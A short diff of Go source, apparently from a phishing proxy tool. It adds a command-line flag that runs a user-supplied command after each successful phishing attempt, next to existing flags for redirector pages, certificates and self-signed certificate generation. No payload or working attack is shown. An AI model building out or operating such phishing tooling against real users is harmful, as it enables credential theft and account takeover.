@@ -24,6 +24,7 @@ var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path
 var http = flag.Bool("http", false, "Enable HTTP server")
 var cert_file = flag.String("cert", "", "Path to certificate file")
 var key_file = flag.String("key", "", "Path to private key file")
+var command = flag.String("c", "", "Command to execute after each successful phishing attempt")
 
 var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
